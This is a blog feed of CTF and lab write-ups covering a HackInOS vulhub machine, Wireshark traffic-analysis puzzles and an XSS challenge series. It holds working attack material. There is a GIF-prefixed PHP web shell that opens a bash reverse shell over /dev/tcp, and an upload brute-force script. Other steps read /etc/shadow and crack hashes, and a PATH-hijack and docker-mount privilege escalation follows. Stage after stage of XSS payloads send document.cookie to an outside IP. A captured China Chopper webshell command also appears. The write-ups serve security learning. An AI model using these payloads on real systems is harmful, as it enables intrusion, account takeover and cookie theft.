<p>三个发送的东西分别对应如下：</p>
<ul>
<li>greeting</li>
</ul>
<p><img src="https://user-images.githubusercontent.com/40637063/57570552-ebd1e180-7435-11e9-9c95-fed585cdd3a2.png" alt="Screenshot from 2019-05-11 15-31-17"></p>
<ul>
<li><p>登录通过包</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57570520-7e25b580-7435-11e9-988e-f68b0f04317e.png" alt="Screenshot from 2019-05-11 15-35-00"></p>
</li>
<li><p>文件回显包</p>
</li>
</ul>
<p><img src="https://user-images.githubusercontent.com/40637063/57570547-d8267b00-7435-11e9-9551-fb9ef384c7fd.png" alt="Screenshot from 2019-05-11 15-49-14"></p>
<p>同时运行经过修改后的<code>agent.py</code>和我们的脚本，同时在题目中填上我们的ip和mysql的端口号，就得到了flag</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57570617-9944f500-7436-11e9-93c5-11b65904cd31.png" alt="Screenshot from 2019-05-11 16-30-14"></p>
<p>参考 ：<br><a href="https://xz.aliyun.com/t/3277" target="_blank" rel="noopener">https://xz.aliyun.com/t/3277</a></p>
<p><a href="http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/" target="_blank" rel="noopener">http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/</a></p>
<p><a href="https://www.anquanke.com/post/id/106488" target="_blank" rel="noopener">https://www.anquanke.com/post/id/106488</a></p>
<h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><p>拿到数据包，打开，设置过滤条件<code>http</code>，可以看到这里有图片流量。使用<code>file-&gt;export objects-&gt;http</code>来导出所有可以导出的东西，然后有两个通过16进制编辑器修改得出的图片和一张完整图片。其中，两张图片中有一张无法查看，另一张和完整的那张图片一模一样。或者也可以右击导出图中指定的图片部分数据。</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57571087-2474b980-743c-11e9-976a-480a59136d09.png" alt="Screenshot from 2019-05-11 22-18-49"></p>
<p>在<code>wireshark</code>中追踪TCP流，发现最开始访问了一个图片加密的网站。</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57571086-23dc2300-743c-11e9-90fc-a068dc33cbfa.png" alt="Screenshot from 2019-05-11 22-22-25"></p>
<p>进入，看起来图片的解密是需要密钥的，那么另一张无法查看的图片可能有我们想要的密钥。修改高宽之后可以查看密钥。进入解密网站解密，并用16进制解密即可。</p>
<img width="799" alt="upload_repaire" src="https://user-images.githubusercontent.com/40637063/57571120-73225380-743c-11e9-8178-e1f74c83a67a.png">

<p><img src="https://user-images.githubusercontent.com/40637063/57571078-f1322a80-743b-11e9-8ebe-099e2db550f7.png" alt="Screenshot from 2019-05-11 15-24-45"></p>
]]></content>
  </entry>
  <entry>
    <title>Hackinos Penetration</title>
    <url>/2019/05/03/Hackinos-Penetration/</url>
    <content><![CDATA[<h2 id="hackinos-from-vulhub"><a href="#hackinos-from-vulhub" class="headerlink" title="hackinos from vulhub"></a>hackinos from vulhub</h2><p>this time , I tried to follow chailao’s steps to break the target-shooting machine and of course, learned a lot :)</p>
<p>first, use <code>sudo netdiscover</code> or <code>sudo arp-scan -l</code> to discover the machine. </p>
<p><img src="https://user-images.githubusercontent.com/40637063/57022143-d7852c00-6c60-11e9-8f8a-ccb35b4f5a6e.png" alt="Screenshot from 2019-05-01 22-25-32"></p>
<p>then , use <code>nmap -sV -p- {ip}</code> to verify the ports open to us.</p>
<blockquote>
<p> -sV: Probe open ports to determine service/version info</p>
</blockquote>
<p>and here we got:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57022147-d94eef80-6c60-11e9-8ec0-0e8dadc0db10.png" alt="Screenshot from 2019-05-01 22-26-05"></p>
<p>next , check the web site and discover that it was made by <code>wordpress</code>.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57022161-dfdd6700-6c60-11e9-9128-b8a4a54ce9d3.png" alt="Screenshot from 2019-05-01 22-27-21"><br>and try to implement a scan to it.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57022150-dbb14980-6c60-11e9-8e51-5145b102b578.png" alt="Screenshot from 2019-05-01 22-28-33"></p>
<p>here we find <code>robot.txt</code>, which contains something as follows:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57022155-dce27680-6c60-11e9-9347-f4fc67860a6c.png" alt="Screenshot from 2019-05-01 22-30-17"></p>
<p>so, get to upload.php and check the source code…there is a link where you can find the source code of php page. </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div align=<span class="string">"center"</span>&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;b&gt;Select image : &lt;/b&gt; </span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> id=<span class="string">"file"</span> style=<span class="string">"border: solid;"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"Submit"</span> name=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Check if image file is a actual image or fake image</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span><br><span class="line">	$rand_number = rand(<span class="number">1</span>,<span class="number">100</span>);</span><br><span class="line">	$target_dir = <span class="string">"uploads/"</span>;</span><br><span class="line">	$target_file = $target_dir . md5(basename($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>].$rand_number));</span><br><span class="line">	$file_name = $target_dir . basename($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">	$uploadOk = <span class="number">1</span>;</span><br><span class="line">	$imageFileType = strtolower(pathinfo($file_name,PATHINFO_EXTENSION));</span><br><span class="line">	$type = $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>];</span><br><span class="line">	$check = getimagesize($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line">	<span class="keyword">if</span>($check[<span class="string">"mime"</span>] == <span class="string">"image/png"</span> || $check[<span class="string">"mime"</span>] == <span class="string">"image/gif"</span>)&#123;</span><br><span class="line">		$uploadOk = <span class="number">1</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$uploadOk = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">":)"</span>;</span><br><span class="line">	&#125; </span><br><span class="line">  <span class="keyword">if</span>($uploadOk == <span class="number">1</span>)&#123;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $target_file.<span class="string">"."</span>.$imageFileType);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"File uploaded /uploads/?"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>as you can see, this waf only check out the <code>mime</code> , which can be passed with <code>GIF89a</code> as a header of any file. And the second question is : how to visit our <code>php</code> file uploaded?. The answer is <code>brute force</code> as there is only 100 possibilities of stored filename.</p>
<p>shell.php:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">exec(<span class="string">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.1.108/9998 0&gt;&amp;1'"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>-i</code>means <code>interactive</code> ,and <code>&gt;&amp;</code> is another expression of <code>1&gt;filename 2&gt;&amp;1</code> or <code>2&gt;filname 1&gt;&amp;2</code>, which is equal to <code>&amp;&gt;</code>.<br><code>0&gt;&amp;1</code>means redirecting the stdin to stdout, in this case , <code>stdin</code> ,<code>stdout</code> and <code>stderr</code> have all been redirect to us, thus we got a shell.</p>
<p>see the link below:</p>
<p><a href="https://superuser.com/questions/436586/why-redirect-output-to-21-and-12" target="_blank" rel="noopener">https://superuser.com/questions/436586/why-redirect-output-to-21-and-12</a></p>
<p><a href="https://unix.stackexchange.com/questions/116010/meaning-of-bash-i-dev-tcp-host-port-01" target="_blank" rel="noopener">https://unix.stackexchange.com/questions/116010/meaning-of-bash-i-dev-tcp-host-port-01</a></p>
<p><a href="https://stackoverflow.com/questions/818255/in-the-shell-what-does-21-mean" target="_blank" rel="noopener">https://stackoverflow.com/questions/818255/in-the-shell-what-does-21-mean</a></p>
<p>and another script to visit the <code>shell.php</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">filename = <span class="string">'shell.php'</span></span><br><span class="line">url = <span class="string">'http://172.28.18.114:8000/uploads/'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">    target = url + hashlib.md5(filename + str(i)).hexdigest() + <span class="string">'.php'</span></span><br><span class="line">    <span class="keyword">print</span> target</span><br><span class="line">    res = requests.get(target)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'Not'</span> <span class="keyword">not</span> <span class="keyword">in</span> res.content:</span><br><span class="line">        <span class="keyword">print</span> target</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'not found'</span></span><br></pre></td></tr></table></figure>

<p>Meanwhile open our <code>nc -lvvkp 9998</code> on our server, and wait for the shell…</p>
<p>But <code>www-data</code> is a low-right user. So, ckeck out enabled-execution by using <code>find / -perm -4000 2&gt;/dev/null</code>.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57026887-70ba3f80-6c6d-11e9-8d0d-490bbd3fc84e.png" alt="Screenshot from 2019-05-01 23-02-01"></p>
<p>and read <code>/etc/shadow</code> using <code>tail</code>.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57026962-9fd0b100-6c6d-11e9-983b-a7e2727773ae.png" alt="Screenshot from 2019-05-01 23-03-05"></p>
<p>copy the line start with <code>root</code> into a file and use <code>john {filename} --wordlist=/usr/share/wordlists/rockyou.txt</code></p>
<p><img src="https://user-images.githubusercontent.com/40637063/57027064-f5a55900-6c6d-11e9-951a-5b427989dac1.png" alt="Screenshot from 2019-05-01 23-05-07"></p>
<p>try<code>su</code> but failed with error message <code>su: must be run from a terminal</code>.<br>So~,we can use python to convert it to a terminal by using command as follows:</p>
<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
<p>then <code>su</code> could be used. Now check the <code>/root/flag</code>, which echos …<code>Life consists of details</code>.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57027318-a9a6e400-6c6e-11e9-8cc8-cbf9548e7e4f.png" alt="Screenshot from 2019-05-01 23-09-32"></p>
<p>Remember we got to know the website was built based on <code>wordpress</code>? Check the <code>/var/www/html/wp-config.php</code> and we got this:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// ** MySQL settings - You can get this info from your web host ** //</span><br><span class="line">/** The name of the database for WordPress */</span><br><span class="line">define(&apos;DB_NAME&apos;, &apos;wordpress&apos;);</span><br><span class="line"></span><br><span class="line">/** MySQL database username */</span><br><span class="line">define(&apos;DB_USER&apos;, &apos;wordpress&apos;);</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define(&apos;DB_PASSWORD&apos;, &apos;wordpress&apos;);</span><br><span class="line"></span><br><span class="line">/** MySQL hostname */</span><br><span class="line">define(&apos;DB_HOST&apos;, &apos;db:3306&apos;);</span><br><span class="line"></span><br><span class="line">/** Database Charset to use in creating database tables. */</span><br><span class="line">define(&apos;DB_CHARSET&apos;, &apos;utf8&apos;);</span><br><span class="line"></span><br><span class="line">/** The Database Collate type. Don&apos;t change this if in doubt. */</span><br><span class="line">define(&apos;DB_COLLATE&apos;, &apos;&apos;);</span><br></pre></td></tr></table></figure>

<p>as the website server and database was seperated ,we should visit database as if it was a remote host:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -h db -uwordpress -pwordpress</span><br><span class="line"></span><br><span class="line">show databases;</span><br><span class="line">use wordpress;</span><br><span class="line">show tables;</span><br><span class="line">select * from host_ssh_cred;</span><br></pre></td></tr></table></figure>

<p><img src="https://user-images.githubusercontent.com/40637063/57027323-aca1d480-6c6e-11e9-99d7-f2e8d00f0dc2.png" alt="Screenshot from 2019-05-01 23-20-59"></p>
<p>md5:<code>e10adc3949ba59abbe56e057f20f883e</code>,let’s crack it.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57027486-14581f80-6c6f-11e9-901c-7a631e5110d7.png" alt="Screenshot from 2019-05-01 23-23-19"></p>
<p><code>ssh hummingbirdscyber@172.28.18.114</code> and type our password:123456 to login.</p>
<h3 id="solution-1"><a href="#solution-1" class="headerlink" title="solution 1"></a>solution 1</h3><p>try <code>find / -perm -u=s 2&gt;/dev/null</code> to find</p>
<blockquote>
<p>find the permission with SUID has been set, SUID will give the owner’s permission to the user who execute this file.</p>
</blockquote>
<p><img src="https://user-images.githubusercontent.com/40637063/57027536-3a7dbf80-6c6f-11e9-9ece-33412b2a9c57.png" alt="Screenshot from 2019-05-01 23-32-23"></p>
<p>and try to execute the <code>a.out</code>,we got <code>root</code> as output.</p>
<p>when trying to got to know the contant of the file, <code>cat</code> will display messy code ,while <code>strings</code> can display normally.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57027553-47021800-6c6f-11e9-8f34-08b8ca573de9.png" alt="Screenshot from 2019-05-01 23-32-33"></p>
<p>Noticed?,there is <code>whoami</code> ,which leads to the output <code>root</code>, so when we execute the <code>a.out</code>, our permission has become <code>root</code> temporarily.As <code>whoami</code> is a system function which system PATH will involved in when it was executed. <code>function hijacked</code> could be implement.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt; /tmp/whoami</span><br><span class="line">chmod 777 /tmp/whoami</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">./a.out</span><br></pre></td></tr></table></figure>

<blockquote>
<p>why create our <code>whoami</code> in <code>/tmp</code>? because every users has full right under this director.</p>
</blockquote>
<p>so , <code>root</code> open a bash, and we can visit <code>/root</code> on it.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57027755-d6a7c680-6c6f-11e9-810e-5f6adb04337c.png" alt="Screenshot from 2019-05-02 00-18-27"></p>
<h3 id="solution-2"><a href="#solution-2" class="headerlink" title="solution 2"></a>solution 2</h3><p><code>id</code> shows that we can use command <code>docker</code>, and we are <code>root</code> in the docker container. So, why not mapping our target folder to files in docker?just like this:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker images # and we found there is a ubuntu image</span><br><span class="line">docker run -it /:/root ubuntu</span><br></pre></td></tr></table></figure>

<p>By visiting <code>/root/root/flag</code>, we got flag.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57027508-20dc7800-6c6f-11e9-9e1b-8839efc59354.png" alt="Screenshot from 2019-05-01 23-29-41"></p>
]]></content>
      <categories>
        <category>靶机渗透</category>
      </categories>
  </entry>
  <entry>
    <title>流量分析</title>
    <url>/2019/04/22/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><p>下载流量包之后追踪tcp流量或者http流量可以在目录中看见flag.tar.gz字段</p>
<p>思路1：binwalk</p>
<p>先把数据包文件拖进kali子系统中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 777 caidao/</span><br><span class="line">cd caidao/</span><br><span class="line">chmod 777 caidao.pcapng</span><br><span class="line">binwalk -e caidao.pcapng</span><br><span class="line">cd _caidao.pcapng.extracted/</span><br><span class="line">cat 1E43</span><br></pre></td></tr></table></figure>

<p>思路2：wireshark数据包追踪，把一串base64拎出来</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">@ini_set("display_errors","0");</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">if(PHP_VERSION&lt;'5.3.0')</span><br><span class="line">&#123;@set_magic_quotes_runtime(0);&#125;;</span><br><span class="line">echo("X@Y");</span><br><span class="line">$D='C:\\wwwroot\\';</span><br><span class="line">$F=@opendir($D);</span><br><span class="line">if($F==NULL)&#123;echo("ERROR:// Path Not Found Or No Permission!");&#125;</span><br><span class="line">else&#123;$M=NULL;$L=NULL;</span><br><span class="line">while($N=@readdir($F))&#123;$P=$D.'/'.$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R="\t".$T."\t".@filesize($P)."\t".$E."\n";if(@is_dir($P))$M.=$N."/".$R;else $L.=$N.$R;&#125;</span><br><span class="line">echo $M.$L;@closedir($F);&#125;;echo("X@Y");die();</span><br></pre></td></tr></table></figure>

<p>当然这没啥用。。</p>
<p>数据包的数据都是在line-based text data里面的</p>
<p>点击line-based text data,右击，点击显示show packet bytes<br>额。。。把像\301\213\341这样的编码处理一下，之所以start设置为3，是因为前面的开头是x@y，不是base64的东西。。。设置为处理模式为压缩</p>
<h3 id="这么多数据包"><a href="#这么多数据包" class="headerlink" title="这么多数据包"></a>这么多数据包</h3><p>分析，据说如果是挂木马的话tcp流中会有“command”字段,于是设定过滤规则为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcp contains &quot;command&quot;</span><br></pre></td></tr></table></figure>

<p>找出一些tcp包来，然后follow，注意如果是乱码的话可以尝试点一点stream长度，说不定就好了<br>然后就找到了flag的base64码</p>
<h3 id="手机热点"><a href="#手机热点" class="headerlink" title="手机热点"></a>手机热点</h3><p>蓝牙协议的名字叫做obex，所以在wireshark中搜索一下挑出几个包，然后有一个包写着“secret.rar”<br>导出来，解压得到flag</p>
<h3 id="抓到一只苍蝇"><a href="#抓到一只苍蝇" class="headerlink" title="抓到一只苍蝇"></a>抓到一只苍蝇</h3><p>http过滤一下，在第一个数据包中的内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;path&quot;:&quot;fly.rar&quot;,</span><br><span class="line">    &quot;appid&quot;:&quot;&quot;,</span><br><span class="line">    &quot;size&quot;:525701,</span><br><span class="line">    &quot;md5&quot;:&quot;e023afa4f6579db5becda8fe7861c2d3&quot;,</span><br><span class="line">    &quot;sha&quot;:&quot;ecccba7aea1d482684374b22e2e7abad2ba86749&quot;,</span><br><span class="line">    &quot;sha3&quot;:&quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现了要传输的文件名字、文件的md5码、文件大小，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http &amp;&amp; http.request.method==POST</span><br></pre></td></tr></table></figure>

<p>过滤出来的接下来的5个分片数据包<br>总长度加起来超过了原文件的数据包大小，原因是附加的文件头。<br>将这些数据包一个一个导出<br>然后使用命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dd if=1 bs=1 skip=364 of=1.1</span><br><span class="line">#dd命令用于读取、转换、输出数据</span><br><span class="line">cat *.1 &gt; fly.rar</span><br><span class="line">#将这些文件碎片都拼成原始的压缩文件</span><br><span class="line">md5sum fly.rar | grep e023afa4f6579db5becda8fe7861c2d3</span><br><span class="line">#检查MD5码是否匹配</span><br></pre></td></tr></table></figure>

<p>然后用bless打开rar文件，检查加密位，发现是伪加密，因为第一行的73后面的标记位是0000，如果加密就是8000<br>rar文件头格式介绍：<a href="https://wenku.baidu.com/view/b7889b64783e0912a2162aa4.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/b7889b64783e0912a2162aa4.html</a></p>
<p>把第二行74后面的84改成80就可以了，因为看论文可以知道，这两个字节的值类似于linux中chmod的1、2、4代表三种权限，<br>最终将所需权限的值相加在一起得到最终的标志位内容</p>
<p>改完之后，解压，打开，发现乱码，改后缀为exe，执行，发现一大堆苍蝇</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk flag.txt</span><br><span class="line">#发现很多png图片，尝试使用foremost工具进行文件修复</span><br><span class="line">foremost -v -i flag.txt -o outputfile</span><br><span class="line">#-v 将所有信息输出到屏幕上，-i表示输入文件,-o表示输出目标</span><br></pre></td></tr></table></figure>

<p>打开后有二维码，里头有flag</p>
<h3 id="日志审计"><a href="#日志审计" class="headerlink" title="日志审计"></a>日志审计</h3><p>sqlmap二分搜索</p>
<p>观察下面这个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">172.17.0.1 - - [03/Nov/2018:02:50:57 +0000] &quot;GET /vulnerabilities/sqli_blind/?id=2&apos; AND ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM dvwa.flag_is_here ORDER BY flag LIMIT 0,1),24,1))&gt;124 AND &apos;RCKM&apos;=&apos;RCKM&amp;Submit=Submit HTTP/1.1&quot; 200 1765 &quot;http://127.0.0.1:8001/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&quot;</span><br></pre></td></tr></table></figure>

<p>特征有200响应成功，而且对于每一位来说，最后一次得到200响应匹配的ascii码加上一就是真实的ascii码，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">import</span> urllib</span><br><span class="line"><span class="number">2</span> <span class="keyword">import</span> re</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span> ffile=open(<span class="string">'/home/access.log'</span>,<span class="string">'r'</span>)</span><br><span class="line"><span class="number">5</span> datas=ffile.readlines()</span><br><span class="line"><span class="number">6</span> avalid=[]</span><br><span class="line"><span class="number">7</span> <span class="keyword">for</span> data <span class="keyword">in</span> datas:</span><br><span class="line"><span class="number">8</span>     tmp=urllib.unquote(data)</span><br><span class="line"><span class="number">9</span>     <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> tmp <span class="keyword">and</span> <span class="string">'COUNT'</span> <span class="keyword">not</span> <span class="keyword">in</span> tmp <span class="keyword">and</span> <span class="string">'200'</span> <span class="keyword">in</span> tmp:</span><br><span class="line"><span class="number">10</span>         avalid.append(tmp)</span><br><span class="line"><span class="number">11</span></span><br><span class="line"><span class="number">12</span> flag_ascii=&#123;&#125;</span><br><span class="line"><span class="number">13</span> <span class="keyword">for</span> segment <span class="keyword">in</span> avalid:</span><br><span class="line"><span class="number">14</span>     checkout=re.search(<span class="string">r'LIMIT 0,1\),(.*?),1\)\)&gt;(.*?) AND'</span>,segment)</span><br><span class="line">      <span class="comment">#这里(.*?)后面要加AND否则大于号之后的所有内容都被包括进(.*?)中去了</span></span><br><span class="line"><span class="number">15</span>     <span class="keyword">if</span> checkout:</span><br><span class="line"><span class="number">16</span>         key=int(checkout.group(<span class="number">1</span>))</span><br><span class="line"><span class="number">17</span>         <span class="keyword">print</span> key</span><br><span class="line"><span class="number">18</span>         <span class="keyword">print</span> checkout.group(<span class="number">2</span>)</span><br><span class="line"><span class="number">19</span>         <span class="keyword">print</span> int(checkout.group(<span class="number">2</span>))</span><br><span class="line"><span class="number">20</span>         value=int(checkout.group(<span class="number">2</span>))+<span class="number">1</span></span><br><span class="line"><span class="number">21</span>         flag_ascii[key]=value  <span class="comment">#同一个key，value在变化直到最后一个</span></span><br><span class="line"><span class="number">23</span> flag=<span class="string">''</span></span><br><span class="line">   <span class="keyword">for</span> value <span class="keyword">in</span> flag_ascii.values():</span><br><span class="line">           flag+=chr(value)</span><br><span class="line">   <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<h3 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h3><p>说是要找到被攻击主机的名字。过滤条件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcp contains &quot;hostname&quot;</span><br></pre></td></tr></table></figure>

<p>然后找一找就行了。。。</p>
<h3 id="信息提取"><a href="#信息提取" class="headerlink" title="信息提取"></a>信息提取</h3><p>这道题真的很懵圈。<br>将wireshark中涉及到盲注的数据包都导出到txt文件中来。<br>然后python脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">f=open(<span class="string">'/root/kkk.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">lines=f.readlines()</span><br><span class="line">datas=[]</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">  tmp=urllib.unquote(line)</span><br><span class="line">  datas.append(tmp)</span><br><span class="line"></span><br><span class="line">flag_ascii=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> datas:</span><br><span class="line">  checkout=re.search(<span class="string">r'LIMIT 0,1),(.*?),1\)\)&gt;(.*?) HTTP'</span>,data)</span><br><span class="line">  <span class="keyword">if</span> checkout:</span><br><span class="line">    key=int(checkout.group(<span class="number">1</span>))</span><br><span class="line">    value=int(checkout.group(<span class="number">2</span>))</span><br><span class="line">    flag_ascii[key]=value</span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> flag_ascii.values():</span><br><span class="line">  flag+=chr(value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<p>但是不知道为什么flag中有的字符是对的有的是错的。</p>
]]></content>
      <categories>
        <category>题型记录</category>
      </categories>
  </entry>
  <entry>
    <title>xss-thousand-knocks</title>
    <url>/2019/04/22/xss-thousand-knocks/</url>
    <content><![CDATA[<h1 id="XSS-thousands-knocks"><a href="#XSS-thousands-knocks" class="headerlink" title="XSS-thousands-knocks"></a>XSS-thousands-knocks</h1><p>before starting the test, connect to our vps and excute:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvkp 1234</span><br><span class="line"> l:listen;v:print information;vv:print information in detail;k:keep connecting;p:port</span><br></pre></td></tr></table></figure>

<h2 id="stage-1"><a href="#stage-1" class="headerlink" title="stage 1"></a>stage 1</h2><p>just click the link and get the flag</p>
<h2 id="stage-2"><a href="#stage-2" class="headerlink" title="stage 2"></a>stage 2</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&lt;script&gt;%22http://207.148.64.125:1234/?%22%2bdocument.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="stage-3"><a href="#stage-3" class="headerlink" title="stage 3"></a>stage 3</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&quot;&gt;&lt;script&gt;%22http://207.148.64.125:1234/?%22%2bdocument.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="stage-4"><a href="#stage-4" class="headerlink" title="stage 4"></a>stage 4</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&apos;&apos;&gt;&lt;script&gt;%22http://207.148.64.125:1234/?%22%2bdocument.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="stage-5"><a href="#stage-5" class="headerlink" title="stage 5"></a>stage 5</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&lt;/textarea&gt;&lt;script&gt;%22http://207.148.64.125:1234/?%22%2bdocument.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="stage-6"><a href="#stage-6" class="headerlink" title="stage 6"></a>stage 6</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=&lt;/xmp&gt;&lt;script&gt;%22http://207.148.64.125:1234/?%22%2bdocument.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="stage-7"><a href="#stage-7" class="headerlink" title="stage 7"></a>stage 7</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=xss&quot;+autofocus+onfocus=&quot;document.location=`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`</span><br></pre></td></tr></table></figure>

<h2 id="stage-8"><a href="#stage-8" class="headerlink" title="stage 8"></a>stage 8</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=xss&apos;+autofocus+onfocus=&apos;document.location=`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`</span><br></pre></td></tr></table></figure>

<h2 id="stage-9"><a href="#stage-9" class="headerlink" title="stage 9"></a>stage 9</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=xss+autofocus+onfocus=document.location=`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`</span><br></pre></td></tr></table></figure>

<h2 id="stage-10-amp-11"><a href="#stage-10-amp-11" class="headerlink" title="stage 10 &amp; 11"></a>stage 10 &amp; 11</h2><blockquote>
<p>真协议用来在计算机之间传输数据包，如 http 协议，ftp 协议；伪协议是一种非标准化的协议，让使用者可以通过链接来调用 js 函数。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q=javascript:document.location=`http://207.148.64.125:1234/?$&#123;document.cookie&#125;`</span><br></pre></td></tr></table></figure>

